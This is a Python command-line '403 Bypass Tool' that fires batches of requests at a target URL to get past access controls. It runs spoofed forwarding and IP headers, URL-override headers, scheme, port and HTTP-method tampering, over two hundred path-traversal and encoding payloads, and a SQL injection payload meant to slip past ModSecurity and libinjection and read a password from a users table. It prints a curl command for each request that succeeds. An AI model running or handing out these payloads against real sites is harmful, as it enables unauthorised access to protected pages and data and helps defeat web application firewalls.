#!/usr/bin/env python3

import argparse
import sys
import requests
from urllib.parse import urlparse

GREEN = '\033[32m'
RED = '\033[31m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
CYAN = '\033[96m'
END = '\033[0m'

UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"

def parse_url(url):
    parsed = urlparse(url)
    domain = parsed.netloc
    path = parsed.path.strip('/') if parsed.path else ''
    return domain, path

def build_curl(target, method='GET', headers=None):
    parts = ["curl -ks"]
    if headers:
        for k, v in headers.items():
            parts.append(f"-H '{k}: {v}'")
    parts.append(f"-X {method}")
    parts.append(f"'{target}'")
    parts.append(f"-H 'User-Agent: {UA}'")
    return ' '.join(parts)

def request(target, method='GET', headers=None, timeout=10):
    hdrs = {'User-Agent': UA}
    if headers:
        hdrs.update(headers)
    curl_cmd = build_curl(target, method, headers)
    try:
        r = requests.request(method, target, headers=hdrs, timeout=timeout, verify=False, allow_redirects=True)
        size = len(r.content)
        return r.status_code, size, r, curl_cmd
    except Exception as e:
        return None, 0, None, curl_cmd

def print_result(label, status_code, length, curl_cmd=None):
    if status_code and 200 <= status_code < 300:
        sys.stdout.write(f"{GREEN}[+] {label} Status: {status_code}, Length : {length} 👌{END}\n")
        if curl_cmd:
            sys.stdout.write(f"  {GREEN}{curl_cmd}{END}\n")
    else:
        code = status_code if status_code else "ERR"
        color = RED if status_code and status_code >= 400 else YELLOW
        sys.stdout.write(f"{color}[x] {label} Status: {code}, Length : {length}{END}\n")
    sys.stdout.flush()

def banner():
    print(f"\n{GREEN}403 Bypass Tool{END} {CYAN}- Develop By Bangyog{END}")
    print(f"{BLUE}{'─'*30}{END}\n")

def header_bypass(target, domain, path):
    print(f"\n{BLUE}[ HTTP Header Bypass ]{END}")
    headers_list = [
        ("X-Originally-Forwarded-For", "127.0.0.1, 68.180.194.242"),
        ("X-Originating-", "127.0.0.1, 68.180.194.242"),
        ("X-Originating-IP", "127.0.0.1, 68.180.194.242"),
        ("True-Client-IP", "127.0.0.1, 68.180.194.242"),
        ("X-WAP-Profile", "127.0.0.1, 68.180.194.242"),
        ("From", "127.0.0.1"),
        ("Profile", f"http://{domain}"),
        ("X-Arbitrary", f"http://{domain}"),
        ("X-HTTP-DestinationURL", f"http://{domain}"),
        ("X-Forwarded-Proto", f"http://{domain}"),
        ("Destination", "127.0.0.1, 68.180.194.242"),
        ("Proxy", "127.0.0.1, 68.180.194.242"),
        ("CF-Connecting_IP", "127.0.0.1, 68.180.194.242"),
        ("CF-Connecting-IP", "127.0.0.1, 68.180.194.242"),
        ("Referer", target),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Remote-IP", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("X-Host", "127.0.0.1"),
        ("X-Forwarded-Host", "127.0.0.1"),
        ("X-Rewrite-URL", f"/{path}"),
        ("Content-Length", "0"),
        ("X-ProxyUser-Ip", "127.0.0.1"),
        ("Base-Url", "127.0.0.1"),
        ("Client-IP", "127.0.0.1"),
        ("Http-Url", "127.0.0.1"),
        ("Proxy-Host", "127.0.0.1"),
        ("Proxy-Url", "127.0.0.1"),
        ("Real-Ip", "127.0.0.1"),
        ("Redirect", "127.0.0.1"),
        ("Referrer", "127.0.0.1"),
        ("Request-Uri", "127.0.0.1"),
        ("Uri", "127.0.0.1"),
        ("Url", "127.0.0.1"),
        ("X-Forward-For", "127.0.0.1"),
        ("X-Forwarded-By", "127.0.0.1"),
        ("X-Forwarded-For-Original", "127.0.0.1"),
        ("X-Forwarded-Server", "127.0.0.1"),
        ("X-Forwarded", "127.0.0.1"),
        ("X-Forwarder-For", "127.0.0.1"),
        ("X-Http-Destinationurl", "127.0.0.1"),
        ("X-Http-Host-Override", "127.0.0.1"),
        ("X-Original-Remote-Addr", "127.0.0.1"),
        ("X-Proxy-Url", "127.0.0.1"),
        ("X-Real-Ip", "127.0.0.1"),
        ("X-Remote-Addr", "127.0.0.1"),
    ]

    for hdr, val in headers_list:
        label = f"{hdr} Payload:"
        status_code, length, _, curl_cmd = request(target, headers={hdr: val})
        print_result(label, status_code, length, curl_cmd)

    # Special cases
    label = "X-Custom-IP-Authorization..;/ Payload:"
    status_code, length, _, curl_cmd = request(f"{target}..;/", headers={"X-Custom-IP-Authorization": "127.0.0.1"})
    print_result(label, status_code, length, curl_cmd)

    label = "X-Original-URL Payload:"
    status_code, length, _, curl_cmd = request(f"{target}/anything", headers={"X-Original-URL": f"/{path}"})
    print_result(label, status_code, length, curl_cmd)

    label = "X-OReferrer Payload:"
    status_code, length, _, curl_cmd = request(target, headers={"X-OReferrer": "https%3A%2F%2Fwww.google.com%2F"})
    print_result(label, status_code, length, curl_cmd)

def protocol_bypass(domain, path, target):
    print(f"\n{BLUE}[ Protocol Based Bypass ]{END}")
    for scheme in ['http', 'https']:
        url = f"{scheme}://{domain}/{path}" if path else f"{scheme}://{domain}"
        label = f"Scheme {scheme}:"
        status_code, length, _, curl_cmd = request(url)
        print_result(label, status_code, length, curl_cmd)

    for val in ['http', 'https']:
        label = f"X-Forwarded-Scheme {val}:"
        status_code, length, _, curl_cmd = request(target, headers={"X-Forwarded-Scheme": val})
        print_result(label, status_code, length, curl_cmd)

def port_bypass(target):
    print(f"\n{BLUE}[ Port Based Bypass ]{END}")
    for port in [443, 4443, 80, 8080, 8443]:
        label = f"X-Forwarded-Port {port}:"
        status_code, length, _, curl_cmd = request(target, headers={"X-Forwarded-Port": str(port)})
        print_result(label, status_code, length, curl_cmd)

def http_method_bypass(target):
    print(f"\n{BLUE}[ HTTP Method Bypass ]{END}")
    for method in ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'TRACE', 'PATCH', 'TRACK', 'CONNECT', 'UPDATE', 'LOCK']:
        label = f"{method}:"
        status_code, length, _, curl_cmd = request(target, method=method)
        print_result(label, status_code, length, curl_cmd)

def url_encode_bypass(target):
    print(f"\n{BLUE}[ URL Encode Bypass ]{END}")
    payloads = [
        "#?", "%09", "%09%3b", "%09..", "%09;", "%20", "%23%3f",
        "%252f%252f", "%252f/", "%2e%2e", "%2e%2e/", "%2f", "%2f%20%23",
        "%2f%23", "%2f%2f", "%2f%3b%2f", "%2f%3b%2f%2f", "%2f%3f", "%2f%3f/",
        "%2f/", "%3b", "%3b%09", "%3b%2f%2e%2e", "%3b%2f%2e%2e%2f%2e%2e%2f%2f",
        "%3b%2f%2e.", "%3b%2f..", "%3b/%2e%2e/..%2f%2f", "%3b/%2e.", "%3b/%2f%2f../",
        "%3b/..", "%3b//%2f../", "%3f%23", "%3f%3f", "..", "..%00/;", "..%00;/",
        "..%09", "..%0d/;", "..%0d;/", "..%5c/", "..%ff/;", "..%ff;/", "..;%00/",
        "..;%0d/", "..;%ff/", "..;\\", "..;\\;", "..\\;", "/%20#", "/%20%23",
        "/%252e%252e%252f/", "/%252e%252e%253b/", "/%252e%252f/", "/%252e%253b/",
        "/%252e/", "/%252f", "/%2e%2e", "/%2e%2e%3b/", "/%2e%2e/", "/%2e%2f/",
        "/%2e%3b/", "/%2e%3b//", "/%2e/", "/%2e//", "/%2f", "/%3b/", "/..",
        "/..%2f", "/..%2f..%2f", "/..%2f..%2f..%2f", "/../", "/../../", "/../../../",
        "/../../..//", "/../..//", "/../..//../", "/../..;/", "/.././../",
        "/../.;/../", "/..//", "/..//../", "/..//../../", "/..//..;/", "/../;/",
        "/../;/../", "/..;%2f", "/..;%2f..;%2f", "/..;%2f..;%2f..;%2f", "/..;/../",
        "/..;/..;/", "/..;//", "/..;//../", "/..;//..;/", "/..;/;/", "/..;/;/..;/",
        "/.//", "/.;/", "/.;//", "//..", "//../../", "//..;", "//./", "//.;/",
        "///..", "///../", "///..//", "///..;", "///..;/", "///..;//", "//;/",
        "/;/", "/;//", "/;x", "/;x/", "/x/../", "/x/..//", "/x/../;/", "/x/..;/",
        "/x/..;//", "/x/..;/;/", "/x//../", "/x//..;/", "/x/;/../", "/x/;/..;/",
        ";", ";%09", ";%09..", ";%09..;", ";%09;", ";%2F..", ";%2f%2e%2e",
        ";%2f%2e%2e%2f%2e%2e%2f%2f", ";%2f%2f/../", ";%2f..", ";%2f..%2f%2e%2e%2f%2f",
        ";%2f..%2f..%2f%2f", ";%2f..%2f/", ";%2f..%2f/..%2f", ";%2f..%2f/../",
        ";%2f../%2f..%2f", ";%2f../%2f../", ";%2f..//..%2f", ";%2f..//../",
        ";%2f..///", ";%2f..///;", ";%2f..//;/", ";%2f..//;/;", ";%2f../;//",
        ";%2f../;/;/", ";%2f../;/;/;", ";%2f..;///", ";%2f..;//;/", ";%2f..;/;//",
        ";%2f/%2f../", ";%2f//..%2f", ";%2f//../", ";%2f//..;/", ";%2f/;/../",
        ";%2f/;/..;/", ";%2f;//../", ";%2f;/;/..;/", ";/%2e%2e", ";/%2e%2e%2f%2f",
        ";/%2e%2e%2f/", ";/%2e%2e/", ";/%2e.", ";/%2f%2f../", ";/%2f/..%2f",
        ";/%2f/../", ";/.%2e", ";/.%2e/%2e%2e/%2f", ";/..", ";/..%2f",
        ";/..%2f%2f../", ";/..%2f..%2f", ";/..%2f/", ";/..%2f//", ";/../",
        ";/../%2f/", ";/../../", ";/../..//", ";/.././../", ";/../.;/../",
        ";/..//", ";/..//%2e%2e/", ";/..//%2f", ";/..//../", ";/..///",
        ";/../;/", ";/../;/../", ";/..;", ";/.;.", ";//%2f../", ";//..",
        ";//../../", ";///..", ";///../", ";///..//", ";x", ";x/", ";x;",
        "&", "%", "../", "..%2f", ".././", "..%00/", "..%0d/", "..%5c", "..\\",
        "..%ff/", "%2e%2e%2f", ". %2e/", "%3f", "%26", "%23", "%2e", "/.",
        "?", "??", "???", "//", "/./", ".//./", "//?anything", "#", "/",
        "/.randomstring", "..;/", ".html", "%20/", ".json", "\\..\\.\\", "/*",
        "./.", "/*/", "/..;/", "//.", "////", ";{path}/",
    ]
    for p in payloads:
        url = f"{target}/{p}" if not p.startswith('/') else f"{target}{p}"
        label = f"Payload [ {p} ]:"
        status_code, length, _, curl_cmd = request(url)
        print_result(label, status_code, length, curl_cmd)

def sqli_bypass(target):
    print(f"\n{BLUE}[ ModSecurity & libinjection Bypass ]{END}")
    payloads = [
        ("' or 1.e(\")='", "'%20or%201.e(%22)%3D'"),
        ("1.e(ascii", "1.e(ascii"),
        ("1.e(substring(", "1.e(substring("),
        ("1.e(ascii 1.e(substring(...", "1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'"),
    ]
    for name, encoded in payloads:
        url = f"{target}/{encoded}"
        label = f"Payload [ {name} ]:"
        status_code, length, _, curl_cmd = request(url)
        print_result(label, status_code, length, curl_cmd)

def main():
    parser = argparse.ArgumentParser(description='403 Bypass Tool - Develop By Bangyog', add_help=False)
    parser.add_argument('-u', '--url', help='Target URL (domain.tld/path)')
    parser.add_argument('--header', action='store_true', help='Header Bypass')
    parser.add_argument('--protocol', action='store_true', help='Protocol Bypass')
    parser.add_argument('--port', action='store_true', help='Port Bypass')
    parser.add_argument('--HTTPmethod', action='store_true', help='HTTP Method Bypass')
    parser.add_argument('--encode', action='store_true', help='URL Encode Bypass')
    parser.add_argument('--SQLi', action='store_true', help='ModSecurity & libinjection Bypass')
    parser.add_argument('--exploit', action='store_true', help='Complete Scan: 403/401 bypass modes')
    parser.add_argument('-h', '--help', action='store_true', help='Show help')

    args = parser.parse_args()

    if args.help or not args.url:
        print(f"\n{CYAN}╔═══════════════════════════════════╗{END}")
        print(f"{CYAN}║    {GREEN}403 Bypass Tool - Usage{CYAN}     ║{END}")
        print(f"{CYAN}╚═══════════════════════════════════╝{END}")
        print()
        print(f"  {YELLOW}USAGE{END}")
        print(f"    python3 403by.py {GREEN}-u{END} {CYAN}<URL>{END} {YELLOW}<mode>{END}")
        print()
        print(f"  {YELLOW}EXAMPLE{END}")
        print(f"    python3 403by.py {GREEN}-u{END} {CYAN}http://target.com/admin{END} {YELLOW}--exploit{END}")
        print()
        print(f"  {YELLOW}OPTIONS{END}")
        print(f"    {GREEN}-u, --url{END}       Target URL (domain.tld/path)")
        print()
        print(f"  {YELLOW}BYPASS MODES{END}")
        print(f"    {GREEN}--header{END}        HTTP Header Bypass")
        print(f"    {GREEN}--protocol{END}      Protocol Based Bypass")
        print(f"    {GREEN}--port{END}          Port Based Bypass")
        print(f"    {GREEN}--HTTPmethod{END}    HTTP Method Bypass")
        print(f"    {GREEN}--encode{END}        URL Encode Bypass")
        print(f"    {GREEN}--SQLi{END}          ModSecurity & libinjection Bypass")
        print()
        print(f"  {YELLOW}ALL BYPASSES{END}")
        print(f"    {GREEN}--exploit{END}       Complete 403/401 Bypass Scan")
        print()
        print(f"  {YELLOW}STATUS COLORS{END}")
        print(f"    {GREEN}[+] 2xx{END}  Success")
        print(f"    {YELLOW}[ ] 3xx{END}  Redirect")
        print(f"    {RED}[x] 4xx{END}  Denied")
        print(f"    {CYAN}[!] 5xx{END}  Error")
        print()
        sys.exit(0 if args.help else 1)

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    target = args.url.rstrip('/')
    domain, path = parse_url(target)

    banner()

    if args.header:
        header_bypass(target, domain, path)
    elif args.protocol:
        protocol_bypass(domain, path, target)
    elif args.port:
        port_bypass(target)
    elif args.HTTPmethod:
        http_method_bypass(target)
    elif args.encode:
        url_encode_bypass(target)
    elif args.SQLi:
        sqli_bypass(target)
    elif args.exploit:
        header_bypass(target, domain, path)
        protocol_bypass(domain, path, target)
        port_bypass(target)
        http_method_bypass(target)
        url_encode_bypass(target)
        sqli_bypass(target)
    else:
        print("Specify a mode or use --exploit for full scan")
        sys.exit(1)

if __name__ == '__main__':
    main()
